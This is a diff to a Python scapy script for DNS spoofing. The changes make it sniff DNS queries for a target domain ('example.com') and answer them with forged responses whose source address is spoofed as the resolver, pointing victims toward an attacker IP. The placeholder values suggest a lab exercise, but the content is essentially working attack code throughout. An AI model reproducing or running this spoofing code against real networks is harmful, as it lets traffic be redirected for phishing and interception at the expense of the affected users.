@@ -14,26 +14,39 @@ dst_ip = None
 dst_port = None
 txid = None
 attacker_ip = "10.0.0.230"
-domain_to_poision = "example.com"
+domain_to_poision = 'example.com'
 
 
 def process_packet(packet):
     # Check if the packet has a DNS layer
     if scapy.DNS in packet:
+        
         dns_layer = packet[scapy.DNS]
         txid = dns_layer.id
         src_ip = packet[scapy.IP].src
         dst_ip = packet[scapy.IP].dst
+        
+        # Segments of a packet
         if scapy.TCP in packet:
             src_port = packet[scapy.TCP].sport
             dst_port = packet[scapy.TCP].dport
         elif scapy.UDP in packet:
             src_port = packet[scapy.UDP].sport
             dst_port = packet[scapy.UDP].dport
-        print(f"DNS request: {dns_layer.show()}")
-        print(src_ip, src_port,dst_ip,txid)
+            
+            
+        #  filter particular packet
         
-        send_packet()
+        if dns_layer.qr == 0:
+            query = dns_layer.qd.qname.decode('utf-8')
+            
+            if domain_to_poision in query:
+                print(f"DNS request: {dns_layer.show()}")
+                print(src_ip, src_port,dst_ip,dst_port,txid)
+                
+                send_packet(src_ip=dst_ip, dst_ip=src_ip, dst_port=src_port, payload=payload)
+            else:
+                pass
         
 def dns_payload():
     payload = scapy.DNS(
@@ -64,10 +77,9 @@ def dns_payload():
         
 payload = dns_payload()
 
-def send_packet(src_ip, src_port, dst_ip, dst_port, payload):
+def send_packet(src_ip, dst_ip, dst_port, payload):
     ip_packet = scapy.IP(src = src_ip, dst = dst_ip)
-    udp_segment = scapy.UDP(sport = src_port, dst_port = dst_port)
-    
+    udp_segment = scapy.UDP(dport = dst_port)
     final_packet = ip_packet/udp_segment/payload
     scapy.send(final_packet)
 
